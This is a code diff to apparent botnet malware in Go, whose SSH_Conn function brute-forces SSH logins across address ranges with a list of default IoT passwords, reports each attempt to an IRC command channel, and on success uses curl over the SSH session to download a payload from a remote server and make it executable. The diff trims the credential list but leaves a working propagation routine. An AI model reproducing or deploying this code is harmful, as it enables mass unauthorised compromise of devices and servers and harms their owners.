@@ -122,9 +122,15 @@ func SSH_Session(ssh_session *ssh.Client, command string) {
 }
 
 func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
+	/*
+		NetArr := []string{
+			chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
+			cgpn4, cgpn5, cgpn6, priv,
+		}
+	*/
+
 	NetArr := []string{
-		chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
-		cgpn4, cgpn5, cgpn6, priv,
+		priv,
 	}
 
 	/*
@@ -132,15 +138,18 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 		You can add more if you want.
 	*/
 	userList := []string{
-		"admin", "root", "user", "guest", "support", "login",
+		"admin", "ubuntu", "user", "guest", "support", "login",
 	}
 
 	passList := []string{
-		"", "root", "admin", "123456", "888888", "default", "54321", "password",
-		"1111", "1111111", "1234", "12345", "pass", "xc3511", "vizxv", "xmhdipc",
-		"juantech", "user", "admin1234", "666666", "klv123", "klv1234", "Zte521", "hi3518",
-		"jvbzd", "7ujMko0vizxv", "7ujMko0admin", "ikwb", "system", "realtek", "00000000", "smcadmin",
-		"123456789", "12345678", "111111", "123123", "1234567890", "login", "supoort", "guest",
+		"", "root", "admin", "123456",
+		// "password", "default", "54321", "888888",
+		/*
+			"1111", "1111111", "1234", "12345", "pass", "xc3511", "vizxv", "xmhdipc",
+			"juantech", "user", "admin1234", "666666", "klv123", "klv1234", "Zte521", "hi3518",
+			"jvbzd", "7ujMko0vizxv", "7ujMko0admin", "ikwb", "system", "realtek", "00000000", "smcadmin",
+			"123456789", "12345678", "111111", "123123", "1234567890", "login", "supoort", "guest",
+		*/
 	}
 
 	for {
@@ -157,23 +166,23 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 				IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+target+" SSH not found.")
 				CheckPort(target)
 			} else {
-				IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+"Try to login to "+turnRange)
+				IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Try to login to "+turnRange)
 				var logCheck bool
 
 				for i := range userList {
 					for j := range passList {
 						_session, err := ssh.Dial("tcp", turnRange, SSH_Config(userList[i], passList[j]))
 						if err == nil {
-							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+"Login success at "+turnRange)
+							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Login success at "+turnRange)
 							SSH_Session(_session, "curl -o ."+set_payload+" "+set_FTP+" --silent")
 							time.Sleep(10 * time.Second)
-							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+turnRange+" Already get The payload.")
+							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :\"curl\" Success on "+turnRange)
 							SSH_Session(_session, "chmod +x ."+set_payload)
 							//SSH_Session(_session, "./."+set_payload+" &")
 							logCheck = true
 							break
 						} else {
-							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+"Failed to login to "+turnRange+
+							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Failed to login to "+turnRange+
 								" > "+fmt.Sprintf("%v", userList[i])+":"+fmt.Sprintf("%v", passList[j]))
 						}
 					}
